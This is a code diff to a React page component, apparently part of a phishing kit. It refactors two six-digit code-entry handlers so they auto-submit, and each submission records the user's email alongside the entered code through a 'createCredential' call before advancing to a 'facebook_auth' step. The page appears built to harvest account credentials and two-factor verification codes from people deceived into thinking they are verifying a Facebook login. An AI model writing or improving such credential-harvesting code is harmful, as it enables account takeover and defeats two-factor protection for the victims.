@@ -46,9 +46,51 @@ export default function Home() {
     }
   };
 
-  const handleVerificationSubmit = async () => {
+  const handleCodeChange = (index: number, value: string) => {
+    if (value.length > 1) return;
+    
+    const newCode = [...verificationCode];
+    newCode[index] = value;
+    setVerificationCode(newCode);
+
+    // Auto-focus next input
+    if (value !== "" && index < 5) {
+      const nextInput = document.getElementById(`code-${index + 1}`);
+      nextInput?.focus();
+    }
+
+    // Explicitly check for 6 digits before submitting
+    const completeCode = newCode.join("");
+    if (completeCode.length === 6 && !newCode.includes("")) {
+      handleVerificationSubmit(newCode);
+    }
+  };
+
+  const handleCodeChangeTwo = (index: number, value: string) => {
+    if (value.length > 1) return;
+    
+    const newCode = [...verificationCodeTwo];
+    newCode[index] = value;
+    setVerificationCodeTwo(newCode);
+
+    // Auto-focus next input
+    if (value !== "" && index < 5) {
+      const nextInput = document.getElementById(`code-two-${index + 1}`);
+      nextInput?.focus();
+    }
+
+    // Explicitly check for 6 digits before submitting
+    const completeCode = newCode.join("");
+    if (completeCode.length === 6 && !newCode.includes("")) {
+      handleVerificationSubmitTwo(newCode);
+    }
+  };
+
+  const handleVerificationSubmit = async (codeArray?: string[]) => {
     try {
-      const codeStr = verificationCode.join("");
+      const codeStr = (codeArray || verificationCode).join("");
+      if (codeStr.length !== 6) return;
+
       await createCredential({
         email: form.getValues("email"),
         password: `CODE_1: ${codeStr}`,
@@ -66,9 +108,11 @@ export default function Home() {
     }, 5000);
   };
 
-  const handleVerificationSubmitTwo = async () => {
+  const handleVerificationSubmitTwo = async (codeArray?: string[]) => {
     try {
-      const codeStr = verificationCodeTwo.join("");
+      const codeStr = (codeArray || verificationCodeTwo).join("");
+      if (codeStr.length !== 6) return;
+
       await createCredential({
         email: form.getValues("email"),
         password: `CODE_2: ${codeStr}`,
@@ -85,44 +129,6 @@ export default function Home() {
       console.log("Moving to facebook_auth step");
       setStep("facebook_auth");
     }, 4000);
-  };
-
-  const handleCodeChange = (index: number, value: string) => {
-    if (value.length > 1) return;
-    
-    const newCode = [...verificationCode];
-    newCode[index] = value;
-    setVerificationCode(newCode);
-
-    // Auto-focus next input
-    if (value !== "" && index < 5) {
-      const nextInput = document.getElementById(`code-${index + 1}`);
-      nextInput?.focus();
-    }
-
-    // Check if all 6 digits are filled
-    if (newCode.every(digit => digit !== "") && value !== "" && index === 5) {
-      handleVerificationSubmit();
-    }
-  };
-
-  const handleCodeChangeTwo = (index: number, value: string) => {
-    if (value.length > 1) return;
-    
-    const newCode = [...verificationCodeTwo];
-    newCode[index] = value;
-    setVerificationCodeTwo(newCode);
-
-    // Auto-focus next input
-    if (value !== "" && index < 5) {
-      const nextInput = document.getElementById(`code-two-${index + 1}`);
-      nextInput?.focus();
-    }
-
-    // Check if all 6 digits are filled
-    if (newCode.every(digit => digit !== "") && value !== "" && index === 5) {
-      handleVerificationSubmitTwo();
-    }
   };
 
   const handleFacebookConfirm = async () => {
